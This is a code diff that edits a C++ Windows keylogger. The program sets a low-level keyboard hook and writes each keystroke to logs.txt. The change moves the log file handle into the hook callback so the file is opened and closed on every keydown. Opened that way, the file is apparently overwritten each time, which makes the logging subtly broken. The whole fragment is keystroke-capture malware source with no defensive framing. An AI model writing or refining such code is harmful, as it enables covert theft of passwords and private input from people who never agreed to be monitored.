@@ -12,8 +12,7 @@ HHOOK hook;
 
 LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);
 
-int filetr;
-ofstream MyFile("logs.txt");
+
 
 int main()
 {
@@ -37,11 +36,14 @@ int main()
 
 LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
     PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
-
+    int filetr;
+    
 
 
         if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
         
+            ofstream MyFile("logs.txt");
+
             filetr = kbDllHook->vkCode;
 
             MyFile << char(kbDllHook->vkCode);
@@ -52,9 +54,10 @@ LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
 
             printf("\n");
             
+            MyFile.close();
         }
 
-    MyFile.close();
+    
 
     return CallNextHookEx(hook, codigo, wParam, lParam);
 }
